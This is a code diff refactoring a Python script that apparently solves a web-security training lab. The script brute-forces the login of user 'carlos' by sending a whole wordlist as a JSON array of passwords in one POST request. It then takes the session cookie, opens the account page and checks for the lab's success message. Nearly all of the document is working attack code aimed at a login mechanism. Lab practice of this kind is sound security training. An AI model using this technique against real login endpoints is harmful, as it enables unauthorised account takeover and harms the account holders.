@@ -16,36 +16,32 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
 }
 
-passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
 
-def brute_force(s, url, username) -> str:
-    login_url = url + '/login'
+def bruteforce(s, url, path, username, list_passwords) -> str:
+    target_url = url + path
     payload = {
         "username": username,
-        "password": passwords
+        "password": list_passwords
     }
-    r = s.post(login_url, data=json.dumps(payload), headers=headers, allow_redirects=False)
-
-    print(r.text)
+    r = s.post(target_url, data=json.dumps(payload), allow_redirects=False)
 
     if r.status_code == 302:
         print("[+] Success")
         return r.cookies['session']
     else:
-        print("[-] Wordlist not contain victim password")
+        print("[-] Wordlist does not contain victim password")
         sys.exit(-1)
 
-def login_acc_by_cookies(s, url, session_cookies):
-    my_account_url = url + '/my-account'
-    cookie = { 'session': session_cookies }
-    r = s.get(my_account_url, cookies=cookie, headers=headers)
+def goto(s, url, path):
+    target_url = url + path
+    r = s.get(target_url)
+    return r
 
-    if 'Log out' in r.text:
-        print("[+] Successfull login by cookie")
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
         sys.exit(0)
-    else:
-        print("[-] Fail to login by cookie")
-        sys.exit(-1)
 
 def main():
     if len(sys.argv) != 2:
@@ -54,10 +50,15 @@ def main():
         sys.exit(-1)
 
     s = requests.Session()
-    url = sys.argv[1]
+    url = sys.argv[1].rstrip('/')
 
-    session_cookies = brute_force(s, url, 'carlos')
-    login_acc_by_cookies(s, url, session_cookies)
+    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
+
+    session_cookies = bruteforce(s, url, '/login', 'carlos', list_passwords)
+    s.cookies['session'] = session_cookies
+    goto(s, url, '/my-account')
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
